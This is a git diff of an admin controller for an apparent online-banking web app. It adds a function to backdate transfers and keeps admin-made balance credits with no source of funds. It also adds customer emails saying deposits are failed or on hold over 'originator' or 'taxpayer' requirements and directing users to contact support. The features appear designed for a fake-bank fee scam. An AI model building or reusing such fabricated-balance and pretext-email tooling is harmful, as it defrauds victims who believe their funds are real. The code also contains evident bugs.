@@ -2,21 +2,139 @@ const User = require("../models/UserModel");
 const sendEmail = require("../utils/emailSender");
 const { handleError } = require("../utils/handleError");
 const TransferAdmin = require("../models/TransferAdmin");
-const LocalTransfer = require('../models/LocalTransferModel')
+const LocalTransfer = require("../models/LocalTransferModel");
 const WireTransfer = require("../models/WireTransferModel");
 const InternalTransfer = require("../models/InternalTransferModel");
+
+
+const formatDateTime = (dateTimeString) => {
+  const date = new Date(dateTimeString);
+  const months = [
+    "Jan",
+    "Feb",
+    "Mar",
+    "Apr",
+    "May",
+    "Jun",
+    "Jul",
+    "Aug",
+    "Sep",
+    "Oct",
+    "Nov",
+    "Dec",
+  ];
+  const day = date.getDate();
+  const month = months[date.getMonth()];
+  const year = date.getFullYear();
+  let hours = date.getHours();
+  const minutes = date.getMinutes();
+  const ampm = hours >= 12 ? "PM" : "AM";
+  hours %= 12;
+  hours = hours || 12;
+  return `${day} ${month} ${year} ${hours}:${
+    minutes < 10 ? "0" : ""
+  }${minutes} ${ampm}`;
+};
+const moment = require("moment");
+
+const editDate = async (req, res) => {
+  try {
+    const { transferId } = req.params;
+
+    // Attempt to find and update the transfer from each model
+    console.log(req.body);
+    let updateDateTransfer = await TransferAdmin.findByIdAndUpdate(
+      transferId,
+      { date: req.body.date },
+      { new: true }
+    );
+console.log(updateDateTransfer);
+    if (!updateDateTransfer) {
+      updateDateTransfer = await LocalTransfer.findByIdAndUpdate(
+        transferId,
+        { date: req.body.date },
+        { new: true }
+      );
+    }
+    if (!updateDateTransfer) {
+      updateDateTransfer = await WireTransfer.findByIdAndUpdate(
+        transferId,
+        { date: req.body.date },
+        { new: true }
+      );
+    }
+    if (!updateDateTransfer) {
+      updateDateTransfer = await InternalTransfer.findByIdAndUpdate(
+        transferId,
+        { date: req.body.date },
+        { new: true }
+      );
+    }
+
+
+
+    if (!updateDateTransfer) {
+      return res.status(404).json({ error: "Transfer not found" });
+    }
+
+    // Respond with success message and updated transfer document
+    res
+      .status(200)
+      .json({
+        message: "Date updated successfully",
+        transfer: updateDateTransfer,
+      });
+  } catch (error) {
+    console.error("Error updating transfer date:", error.message);
+    res.status(400).json({ error: "Failed to update transfer date" });
+  }
+};
+
+
+const editDateTwo = async(req, res) => {
+  try {
+     const { transferId } = req.params;
+
+     // Attempt to find and delete the transfer from each model
+     let updateDateTransfer = await TransferAdmin.findById(transferId);
+
+     if (!updateDateTransfer) {
+       updateDateTransfer = await LocalTransfer.findById(transferId);
+     }
+     if (!updateDateTransfer) {
+       updateDateTransfer = await WireTransfer.findById(transferId);
+     }
+     if (!updateDateTransfer) {
+       updateDateTransfer = await InternalTransfer.findById(transferId);
+     }
+
+     if (!updateDateTransfer) {
+       return res.status(404).json({ error: "Transfer not found" });
+     }
+ 
+     updateDateTransfer.date = req.body.date
+     console.log(req.body.date);
+     console.log(updateDateTransfer);
+     console.log(updateDateTransfer.date)
+     await updateDateTransfer.save()
+     console.log(updateDateTransfer.date);
+
+     res.status(200).json({ message: "date update successfully", transfer: updateDateTransfer})
+
+  } catch (error) {
+    
+  }
+}
 
 const deleteUser = async (req, res) => {
   try {
     const { userId } = req.params;
 
     // Check if the user exists
-    const user = await User.findByIdAndDelete(userId)
+    const user = await User.findByIdAndDelete(userId);
     if (!user) {
       return res.status(404).json({ error: "User not found" });
-    } 
-
-   
+    }
 
     res.status(200).json({ message: "User deleted successfully" });
   } catch (error) {
@@ -24,7 +142,6 @@ const deleteUser = async (req, res) => {
     res.status(500).json({ error: "Server error while deleting user" });
   }
 };
-
 
 const deleteTransfer = async (req, res) => {
   try {
@@ -43,7 +160,7 @@ const deleteTransfer = async (req, res) => {
       deletedTransfer = await InternalTransfer.findByIdAndDelete(transferId);
     }
 
-    console.log(deletedTransfer);
+    
 
     if (!deletedTransfer) {
       return res.status(404).json({ error: "Transfer not found" });
@@ -85,21 +202,17 @@ const deleteTransfer = async (req, res) => {
   }
 };
 
-module.exports = {
-  deleteTransfer,
-};
-
 
 
 const adminTransfer = async (req, res) => {
   try {
-    const { account_number, amount, status, account,  remarks, pin } = req.body;
+    const { account_number, amount, status, account, remarks, pin } = req.body;
     if (!account_number || isNaN(amount) || amount <= 0) {
       return res.status(400).json({ error: "Invalid input data." });
     }
 
     const admin = await User.findById(req.user.userId);
-    console.log(admin);
+   
     if (admin.pin && admin.pin !== pin) {
       return res.status(401).json({ status: "failed", error: "Invalid PIN." });
     }
@@ -120,7 +233,7 @@ const adminTransfer = async (req, res) => {
       await user.save();
     } else if (account === "checkings") {
       user.checkings_balance += parseInt(amount);
-      await user.save()
+      await user.save();
     }
 
     const internalTransfer = await TransferAdmin.create({
@@ -174,13 +287,19 @@ const adminTransfer = async (req, res) => {
         <div class="container">
           <h1>Deposit Confirmation</h1>
           
-          <p>Dear ${user.name}, Your deposit has been confirmed.</p>
+          <p>Dear ${user.name},  Your account has been credited. Kindly sign in to make a 
+          transfer to your prefered bank or order a debit card to your mailing address.
+          </p>
           
+      
+
+      <p>Transaction information.</p>
+
           <p><strong>Deposit amount:</strong> $${internalTransfer.amount}</p>
           
-          <p><strong>Deposit type:</strong> Transfer deposit</p>
+          <p><strong>Description:</strong> ${internalTransfer.remarks}</p>
           
-          <p><strong>Sender Details:</strong> Grant funds/dep.</p>
+          <p><strong>Date:</strong> ${formatDateTime(internalTransfer.date)}</p>
           
           <p><strong>Transaction ID: ${internalTransfer._id}</strong></p>
           
@@ -228,7 +347,7 @@ const adminTransfer = async (req, res) => {
 
 const getAllUser = async (req, res) => {
   try {
-    const users = await User.find({}).sort({createdAt: -1});
+    const users = await User.find({}).sort({ createdAt: -1 });
     res.status(200).json({ status: "success", users });
   } catch (error) {
     console.log(error);
@@ -236,27 +355,28 @@ const getAllUser = async (req, res) => {
   }
 };
 
-//  status: {
-//       type: String,
-//       enum: ["pending", "completed", "failed"],
-//       default: "completed",
-//     },
-const updateTransferFailed = async(req, res) => {
-    const { transferId } = req.params
+const updateTransferFailed = async (req, res) => {
+  const { transferId } = req.params;
 
-    const transfer = await LocalTransfer.findOne({ _id: transferId})
-    if(!transfer) {
-        return res.status(404).json({ error: `no transfer found with id ${transferId} `})
-    }
-    
- transfer.status = 'failed'
- await transfer.save()
- const user = await User.findById(transfer.user);
- res.status(200).json({ status: "success", message: "transfer updated successfully" , transfer});
+  const transfer = await LocalTransfer.findOne({ _id: transferId });
+  if (!transfer) {
+    return res
+      .status(404)
+      .json({ error: `no transfer found with id ${transferId} ` });
+  }
 
-    const subject = "Transfer Failed";
-    const text = `Hi ${transfer.name},\n\.`;
-    const html = `
+  transfer.status = "failed";
+  await transfer.save();
+  const user = await User.findById(transfer.user);
+  res.status(200).json({
+    status: "success",
+    message: "transfer updated successfully",
+    transfer,
+  });
+
+  const subject = "Transfer Failed";
+  const text = `Hi ${transfer.name},\n\.`;
+  const html = `
       <!DOCTYPE html>
       <html lang="en">
       <head>
@@ -294,6 +414,19 @@ const updateTransferFailed = async(req, res) => {
       <body>
         <div class="container">
           <h1>Transaction failed</h1>
+
+<p>
+Dear ${user.name}, Your deposit has failed due to an originator requirement; kindly contact
+ support <a href="mailto:support@crestwoodscapitals.com">here</a> to 
+ resolve your originator requirement.
+
+Thank you for choosing our services.
+
+Earn discounts when you send money by signing up for our no-cost rewards program!
+Security Information:
+
+It's important to keep your account secure. Here are some security tips: </p>
+
           
     
           
@@ -324,27 +457,28 @@ const updateTransferFailed = async(req, res) => {
       </html>
     `;
 
-    await sendEmail(user.email, subject, text, html);
-    // await sendEmail("anniemary841@gmail.com", subject, text, html);
-    await sendEmail("companychris00@gmail.com", subject, text, html);
-}
+  await sendEmail(user.email, subject, text, html);
+  // await sendEmail("anniemary841@gmail.com", subject, text, html);
+  await sendEmail("companychris00@gmail.com", subject, text, html);
+};
 
 const updateTransferCompleted = async (req, res) => {
- const { transferId } = req.params;
- const transfer = await LocalTransfer.findOne({ _id: transferId });
+  const { transferId } = req.params;
+  const transfer = await LocalTransfer.findOne({ _id: transferId });
   if (!transfer) {
     return res
       .status(404)
       .json({ error: `no transfer found with id ${transferId} ` });
   }
-    
 
- transfer.status = "completed";
- await transfer.save();
- const user = await User.findById(transfer.user);
-  res
-    .status(200)
-    .json({ status: "success", message: "transfer updated successfully", transfer });
+  transfer.status = "completed";
+  await transfer.save();
+  const user = await User.findById(transfer.user);
+  res.status(200).json({
+    status: "success",
+    message: "transfer updated successfully",
+    transfer,
+  });
 
   const subject = "Transfer completed";
   const text = `Hi ${user.name},\n\.`;
@@ -385,7 +519,11 @@ const updateTransferCompleted = async (req, res) => {
       </head>
       <body>
         <div class="container">
-          <h1>Transaction completed email</h1>
+          <h1>Transaction completed</h1>
+
+
+        <p> Dear ${user.name}, Your transaction has been completed. Thank you for choosing our services. </p>
+
           
     
           
@@ -421,26 +559,25 @@ const updateTransferCompleted = async (req, res) => {
   await sendEmail("companychris00@gmail.com", subject, text, html);
 };
 
-
-
 const updateTransferPending = async (req, res) => {
   const { transferId } = req.params;
   const transfer = await LocalTransfer.findOne({ _id: transferId });
-   if (!transfer) {
-     return res
-       .status(404)
-       .json({ error: `no transfer found with id ${transferId} ` });
-   }
-    
+  if (!transfer) {
+    return res
+      .status(404)
+      .json({ error: `no transfer found with id ${transferId} ` });
+  }
 
   transfer.status = "pending";
   await transfer.save();
   const user = await User.findById(transfer.user);
-  res
-    .status(200)
-    .json({ status: "success", message: "transfer updated successfully" , transfer});
+  res.status(200).json({
+    status: "success",
+    message: "transfer updated successfully",
+    transfer,
+  });
 
-  const subject = "Transfer pending";
+  const subject = "Transfer On Hold";
   const text = `Hi ${user.name},\n\.`;
   const html = `
       <!DOCTYPE html>
@@ -479,7 +616,10 @@ const updateTransferPending = async (req, res) => {
       </head>
       <body>
         <div class="container">
-          <h1>Transaction pending emails </h1>
+           <h1>Transaction on hold </h1>
+
+<p>Dear ${user.name},  Your deposit is on hold due to taxpayer requirements; 
+kindly contact support <a href="mailto:support@crestwoodscapitals.com">here</a> to resolve your taxpayer requirement.</p>
           
     
           
@@ -514,7 +654,6 @@ const updateTransferPending = async (req, res) => {
   // await sendEmail("anniemary841@gmail.com", subject, text, html);
   await sendEmail("companychris00@gmail.com", subject, text, html);
 };
-
 
 const getAllTransfersAdmin = async (req, res) => {
   try {
@@ -556,26 +695,24 @@ const getAllTransfersAdmin = async (req, res) => {
     );
 
     // Return the combined history array as response
-    res
-      .status(200)
-      .json({
-        nbhits: allTransfersHistory.lenght,
-        history: allTransfersHistory,
-      });
+    res.status(200).json({
+      nbhits: allTransfersHistory.lenght,
+      history: allTransfersHistory,
+    });
   } catch (error) {
     console.error("Error fetching transfer histories:", error);
     res.status(500).json({ error: "Internal server error" });
   }
 };
 
-
 module.exports = {
-    adminTransfer,
-    getAllUser,
-    updateTransferCompleted,
-    updateTransferFailed,
-    updateTransferPending,
-    getAllTransfersAdmin,
-    deleteUser,
-    deleteTransfer
-}
+  adminTransfer,
+  getAllUser,
+  updateTransferCompleted,
+  updateTransferFailed,
+  updateTransferPending,
+  getAllTransfersAdmin,
+  deleteUser,
+  deleteTransfer,
+  editDate
+};
